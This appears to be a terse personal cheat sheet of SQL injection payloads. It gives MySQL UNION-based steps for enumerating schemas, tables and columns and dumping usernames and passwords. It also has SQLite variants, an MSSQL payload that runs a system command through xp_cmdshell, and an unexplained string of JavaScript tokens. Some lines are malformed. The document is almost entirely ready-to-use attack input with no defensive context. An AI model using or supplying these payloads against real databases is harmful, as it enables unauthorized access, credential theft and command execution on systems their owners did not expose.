
```
test' ORDER BY 1-- - # Add one untill no more ouput
test' UNION SELECT 1,2,3,4-- - # Select all columns
test' UNION SELECT 1,2,3,@@version-- - # Select version number
test' UNION SELECT 1,2,3,group_concat(schema_name) FROM information_schema.schemata -- -
test' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
test' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_schema=”usersbijvoorbeeld”-- - # no users but DB name
test' UNION SELECT 1,2,3,group_concat(id,0x3a,user,0x3a,pass) FROM idbbeta.users-- -
```

Dunno
```
' UNION ALL SELECT username,password from users where username='admin' --
' UNION ALL SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
```

### SQL Lite:
```
' union FROM SQLITE_MASTER --
' union select password,password from user where user="admin";
```

In javascript:
```
,length,charCodeAt,fromCharCode,substring,ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=,utf8_encode,charAt,join,slice,==,=,value,username,getElementById,password,p2,submit,form
```

Microsoft sql command injection
```
' or 1=1; exec master..xp_cmdshell 'ping 127.0.0.1'--
```